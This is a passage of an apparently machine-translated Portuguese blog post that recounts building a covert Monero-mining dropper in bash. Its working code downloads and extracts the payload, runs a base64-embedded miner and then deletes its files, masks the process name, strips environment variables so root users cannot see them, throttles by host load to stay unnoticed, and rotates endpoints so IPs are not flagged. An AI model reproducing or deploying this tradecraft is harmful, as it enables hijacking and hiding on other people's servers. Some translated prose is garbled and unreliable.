<span class=hljs-keyword>fi</span></code></pre><p>Agora é hora de baixar nosso payload, optamos por suportar wget e curl, já sabemos como usar wget com sinalizadores cuidadosos, para curl é um pouco diferente. Temos que criar um arquivo de configuração e substituir<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>A última etapa é apenas extrair a carga útil<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>Vale ressaltar a utilização de um [CDN] para atendimento à carga útil. Aqui, novamente, o Cloudflare para o resgate nos salva de gastos com largura de banda. Simplesmente renomeando nossa carga compactada com um<em> extensão de arquivo</em> suportado por cloudflare ... torna-se em cache. O Cloudflare não verifica os cabeçalhos do que está atendendo, talvez porque fazer isso nessa escala seja simplesmente impraticável.<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> Aventuras em Bashland</a></h2><p>O Bash foi escolhido com o pressuposto de que é portátil, não parece muito fora do lugar e é mais onipresente em comparação com outras linguagens de script, como perl, ruby ​​ou python. A verdade é que um binário autônomo escrito em golang ou lua teria sido muito mais fácil, com menos bugs e mais fácil de manter, basicamente o bash era a pior escolha possível, em minha defesa, no momento em que coçei tantas comichões com o bash , era tarde demais para reescrever e também estava ficando meio chato.<p>Também havia a opção de usar o busybox com o sinalizador de tempo de compilação para usar todos os builtins (como grep e sed), no entanto, usar builtins dessa forma não permite gerar jobs (fork) e expõe o daemon a possíveis deadlocks.<p>Descreverei algumas funções do bash aqui, com a lista completa disponível<a href=\assets/posts/bash_functions.txt> aqui</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
    <span class=hljs-keyword>while</span> [ <span class=hljs-variable>$c</span> -lt <span class=hljs-variable>$1</span> ]; <span class=hljs-keyword>do</span><span class=hljs-built_in>printf</span><span class=hljs-string>"\x<span class=hljs-subst>$(printf '%x' $((97+RANDOM%25)</span>))"</span>
        c=$((c+<span class=hljs-number>1</span>))
    <span class=hljs-keyword>done</span>
}</code></pre><p>Use o<code>RANDOM</code> variável para obter um número entre 97-122 correspondendo a um código de caractere, printf deve ser um embutido, não queremos bifurcar dentro de um loop.<pre><code class="bash hljs"><span class=hljs-comment>## make a new file descriptor named $1</span><span class=hljs-function><span class=hljs-title>newfd</span></span>() {
    <span class=hljs-built_in>eval</span><span class=hljs-string>"local fd=\${<span class=hljs-variable>$1</span>}"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span> &>/dev/null
    <span class=hljs-built_in>local</span> pp=<span class=hljs-string>".<span class=hljs-subst>$(rand_string 8)</span>"</span>
    mkfifo <span class=hljs-variable>$pp</span><span class=hljs-built_in>unset</span><span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec {<span class=hljs-variable>$1</span>}<><span class=hljs-variable>$pp</span>"</span><span class=hljs-comment># unlink the named pipe</span>
    rm -f <span class=hljs-variable>$pp</span>
}</code></pre><p>Aproveite os canais para criar descritores de arquivo anônimos; eles não se comportam exatamente como descritores de arquivo, mas são bons o suficiente para<a href=https://en.wikipedia.org/wiki/Inter-process_communication> IPC</a>.<pre><code class="bash hljs"><span class=hljs-comment>## https://unix.stackexchange.com/a/407383/163931</span><span class=hljs-function><span class=hljs-title>fleep</span></span>()
{
    <span class=hljs-comment># log "fleep: called by ${FUNCNAME[1]}"</span>
    [ -n <span class=hljs-string>"<span class=hljs-variable>${_snore_fd}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> != 0 ] ||
        newfd _snore_fd
    <span class=hljs-comment># log "fleep: starting waiting with ${_snore_fd}"</span><span class=hljs-keyword>if</span> ! <span class=hljs-built_in>command</span> >&<span class=hljs-variable>${_snore_fd}</span>; <span class=hljs-keyword>then</span>
        newfd _snore_fd
    <span class=hljs-keyword>fi</span><span class=hljs-built_in>read</span> -t <span class=hljs-variable>${1:-1}</span> -u <span class=hljs-variable>$_snore_fd</span><span class=hljs-comment># log "fleep: ended"</span>
}</code></pre><p>Dormindo sem bifurcação, abusando da funcionalidade de tempo limite do builtin de leitura, ele usa um descritor de arquivo dedicado e devemos garantir que ele esteja disponível para evitar o encerramento.<p>Existem funções como<code>get_pid_stats</code>, <code>usgmon_prc</code>, <code>proc_usg_u</code>, <code>cpumon</code>, <code>loadmon</code> são usados ​​para monitorar o uso do sistema, todos eles fazem uso do Linux<code>/proc</code> arquivos sem ferramentas como<code>ps</code> , então sem bifurcação, tudo puro bash.<pre><code class="bash hljs"><span class=hljs-function><span class=hljs-title>start_coproc</span></span>() {
    <span class=hljs-built_in>local</span><span class=hljs-built_in>unset</span><span class=hljs-keyword>while</span> :; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> = <span class=hljs-built_in>exec</span> ]; <span class=hljs-keyword>then</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span><span class=hljs-keyword>else</span>
            coproc_name=<span class=hljs-string>"<span class=hljs-variable>$1</span>"</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$UNSET_COPROC_VARS</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>unset</span>=<span class=hljs-string>"unset <span class=hljs-variable>$UNSET_COPROC_VARS</span>;"</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>log</span><span class=hljs-string>"starting coproc <span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-built_in>unset</span> -v <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span><span class=hljs-comment>## only the variable, not functions</span><span class=hljs-built_in>eval</span><span class=hljs-string>"coproc <span class=hljs-variable>$coproc_name</span> { <span class=hljs-variable>$unset</span> $*; }"</span><span class=hljs-comment># 2>/dev/null</span><span class=hljs-built_in>unset</span> UNSET_COPROC_VARS
        wait_coproc <span class=hljs-string>"<span class=hljs-variable>$coproc_name</span>"</span> 3 && <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
}
<span class=hljs-function><span class=hljs-title>stop_coproc</span></span>() {
    <span class=hljs-comment>## clear fds</span>
    id_coproc <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span> && [ -n <span class=hljs-string>"<span class=hljs-variable>$job_n</span>"</span> ] && <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> %<span class=hljs-variable>$job_n</span>"</span> ||
        { <span class=hljs-built_in>eval</span><span class=hljs-string>"kill -<span class=hljs-variable>${2:-9}</span> \${<span class=hljs-variable>${1}</span>_PID}"</span>; } ||
        { <span class=hljs-built_in>log</span><span class=hljs-string>"could not kill the specified coprocess with job <span class=hljs-variable>$job_n</span>"</span> && <span class=hljs-built_in>return</span> 1; }
}</code></pre><p>Coprocessos estão disponíveis desde o bash<code>v4</code> , eles são como empregos, exceto que têm um nome e seus próprios descritores de arquivo.<pre><code class="bash hljs"><span class=hljs-comment>## clear file descriptors</span><span class=hljs-function><span class=hljs-title>clear_fds</span></span>() {
    <span class=hljs-built_in>local</span> fd
    <span class=hljs-keyword>for</span> fd <span class=hljs-keyword>in</span> $(compgen -G <span class=hljs-string>"/proc/<span class=hljs-variable>$BASHPID</span>/fd/*"</span>); <span class=hljs-keyword>do</span>
        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Estamos escrevendo um daemon, que é um processo de longa duração, e estamos usando muitos descritores de arquivo, realmente queremos fazer algumas limpezas para evitar incorrer em<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Esta função depende de<a href=https://ipinfo.io/> ipinfo</a> para determinar a região do trabalhador, o que permite ajustar alguma lógica dependente da região,<a href=\assets/posts/geoip.json> geoip.json</a> agrupa países em regiões, uma vez que queremos a região de nível superior e não estamos interessados ​​no país específico.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash tem suporte para conexões tcp, por ter uma abstração sobre<code>/dev/tcp</code> (também para udp, mas na maioria das vezes parece ser desabilitado em tempo de compilação, então você não pode confiar nisso). Esses arquivos são uma coisa do bash, eles não fazem parte do linux<code>/dev</code> árvore.<p>Vale a pena mencionar também um sistema de bloqueio para lidar com a simultaneidade entre trabalhos bash. Para permitir que vários trabalhos funcionem com bloqueios, todos eles precisam compartilhar um descritor de arquivo, então nosso<code>locker</code> que também é um trabalho, deve ser iniciado antes de outros trabalhos que desejam usar a fechadura. O armário simplesmente continua lendo<code>stdin</code> esperando por solicitações de bloqueio, respondendo em<code>stdout</code> dependendo do estado booleano atual armazenado em uma variável. Não garanto que essa abordagem seja livre de corrida, mas parece funcionar decentemente, por outro lado, descobri que os descritores de arquivo não são muito confiáveis, pois suspeito que haja alguns buffers que não são liberados em algum lugar do<em> tubos</em> e eventualmente atingir bloqueios (o que significa que você não pode confiar que o armário lhe dará uma resposta o tempo todo).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Limpe o seu lixo ... programas bash complexos acabam usando muitas variáveis, e se você abusar do espaço global, ele ficará inchado. Se você estiver gerando jobs shell, eles herdam todo o ambiente (que é efetivamente duplicado, não compartilhado), você pode rapidamente acabar com o bash eating<code>100M</code> de memória, não é legal. Também queremos ser discretos. Em nosso cenário de implantação, o adversário<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> pode potencialmente ter acesso root e informações completas sobre nossos processos<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> e você sabe ... cada processo contém informações sobre o comando completo que o iniciou e as variáveis ​​de ambiente exportadas.<h2 id=configuration><a class=header-anchor href=#configuration> Configuração</a></h2><p>Assim que tivermos nosso ambiente e nossas ferramentas, precisamos ajustar nosso minerador para a máquina em que está sendo executado, etapas de configuração em pseudocódigo:<ul><li><p>nome do processo para o mineiro<li><p>informações do host (ram / núcleos / caches /<code>ENV_VARS</code>)<li><p>versão de configuração<li><p><code>worker_id</code> para o minerador (de ip e host)<li><p>ip / porta para a conexão</ul><p>A escolha de um nome para o processo é necessária para<em> ocultar</em> o fato de estarmos executando um minerador, mas não estamos apenas renomeando nosso binário, temos uma lista de<strong> máscaras</strong> para candidatos em potencial (um arquivo de texto simples em que cada linha é uma máscara):<ul><li><p>escolha uma máscara aleatoriamente<li><p>embaralhe os elementos da cauda da string (todos exceto o primeiro) para obter um comando de processo diverso. Agora temos uma string parecida com<code>cmd --arg2 --arg1 --arg3</code> . Esta é a nossa máscara de mineiro, nós rodamos o binário<em> sem</em> argumentos, mas parece que iniciamos um comando<code>cmd</code> com argumentos<code>--arg1 --arg2 --arg3</code> . Espaços e travessões são permitidos em nomes de arquivos, então é bom rodar um binário com esse nome, não parece que o Linux faz distinção entre o executável e os argumentos ao armazenar os comandos do processo.<p>A configuração do minerador é carregada automaticamente de<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, com o tempo, o minerador upstream conseguiu muitos<strong> sintonização automática</strong> recursos, por isso tornou parte dos meus scripts redundantes, mas a diferença entre o upstream e o downstream aqui é que o objetivo do upstream é maximizar<em> atuação</em> , enquanto nosso objetivo é maximizar<em> eficiência e ofuscação</em> , não queremos ultrapassar o sistema, queremos sugar um pouco sem interromper o serviço.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Para isso, precisamos de uma compreensão mais granular do ambiente, o<code>l2/l3</code> estrutura de cache do processador, memória ram e núcleos e processador atual<em> média</em> carga e cpu<em> uso</em>. Eu tentei construir um<a href=https://en.wikipedia.org/wiki/Finite-state_machine> máquina de estado</a> no bash que começaria do mínimo e tentaria configurações diferentes lentamente estabelecendo-se no melhor da média. Era um<strong> enorme</strong> desperdício de esforço repleto de<a href=https://en.wikipedia.org/wiki/Technical_debt> dívida técnica</a> que faliu muito rapidamente e foi quase todo descartado, com apenas os remanescentes remanescentes na base de código.<p>Frack todo esse jumbo de autoajuste, acabamos de fazer o minerador dormir dependendo do uso / carga do host, isso exigiu modificações do minerador para<code>sleep</code> entre rendimentos de threads, e algumas correções para o watchdog de configuração<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , o que nos permitiria recarregar a quantidade adormecida em tempo de execução. A lógica é muito mais simplificada e tem a seguinte aparência:<ul><li><p>se o uso estiver acima / abaixo de $ TARGET_USAGE (± margem de erro), aumentar / diminuir o sono<li><p>se a carga média dentro de<code>1m</code> está acima / abaixo de $ TARGET_LOAD pausar / retomar mineração</ul><h3 id=connection><a class=header-anchor href=#connection> Conexão</a></h3><p>Em nosso bash roundup, mostramos utilitários para conexão. Por que precisamos disso? Porque precisamos de diversidade; simplesmente codificar um endpoint na configuração não vai durar muito, quando algo parece suspeito e tem atividade de rede, os IPs são sinalizados.<p>No início, experimentamos alguns métodos:<ul><li><p>usando<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> proxychains</a> para sobrecarregar as chamadas de rede do minerador, mas exigia que o minerador fosse construído com bibliotecas dinâmicas e você tinha que enviá-las com a carga útil, por isso era impraticável.<li><p>executando um<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> túnel dianteiro</a> lado a lado com o minerador: isso teve uma grande sobrecarga de configuração, pois agora estávamos configurando dois processos em cada implantação, o que resultou em mais bugs.</ul><p>No final, decidimos enviar apenas uma lista de endpoints, armazenados em variáveis ​​bash, escolhendo um ao acaso. É claro que as conexões eram criptografadas. Quais são esses pontos de extremidade? Encaminhadores para o proxy que lidaria com os trabalhos dos mineiros.</p><img src=/assets/posts/chronichles_of_a_cryptonote_dropper/code/output/miner.png><p>Por que precisamos de um<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> procuração de mineração</a> ? Eu nunca realmente passei de ~ 100 conexões simultâneas, então um proxy não era realmente necessário para a carga da rede, mas era conveniente para negociar o algoritmo de hashing e fornecer diferentes alvos de dificuldade para diferentes mineradores, para evitar que os mineradores trabalhassem<strong> dificuldade</strong> metas que levariam muito tempo para serem concluídas e evitariam o risco de desperdiçar computação em trabalhos inacabados.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> O software do pool também exigiu algumas modificações, pois estava felizmente anunciado para ser um proxy em solicitações HTTP simples ...<em> que teve que ser expirado</em> , e uma bifurcação adicionou controle de acesso, então baseamos nossos mods nisso.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Editando json</a></h3><p>Aplicando modificações a um arquivo json apenas com bash, conseguimos alguma substituição env var e alguma regex. Inicialmente, estávamos contando com um<code>envsubst</code> binário para aplicar variáveis, então fomos à festa completa<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> com esta lógica:<ul><li><p>ler modelo de configuração<li><p>substitua todas as aspas por uma string muito esotérica (como<code>_#_#</code>)<li><p><code>eval</code> o modelo<li><p>substitua todas as ocorrências esotéricas de volta com aspas</ul><p>Além de evitar subprocessos, outra vantagem é que obtemos recursos bash completos em nossos modelos. Para ler e escrever sem modelos, temos que contar com os recursos do bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Isso só nos permite editar linhas únicas, para entradas de várias linhas, considera apenas a primeira linha ... mas é bom o suficiente para o nosso caso de uso.<h2 id=runtime><a class=header-anchor href=#runtime> Tempo de execução</a></h2><p>Qual é a aparência do nosso tempo de execução? Temos um processo bash principal que executa o loop principal, depois o subprocesso miner, o subprocesso do monitor de CPU, o locker e o tuner. Isso é quase um punhado.<p>Primeiro, queremos garantir que, se algo der errado, não deixarmos uma bagunça, isso significa que usamos uma armadilha bash para realizar limpezas na rescisão<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> cancela a configuração do trap para evitar recursão. A armadilha mata todos os empregos e remove o ambiente de trabalho.<p>É hora de iniciar o minerador, que é armazenado como uma variável bash na codificação base64. Despejamos no sistema de arquivos, depois despejamos a configuração, executamos o minerador e removemos o minerador e a configuração. No Linux, você pode remover o executável de um processo em execução (no Windows isso não é permitido).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Quando o minerador está em execução, no sistema de arquivos há apenas um<code>.. /</code> diretório com um<code>b64</code> link nele.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
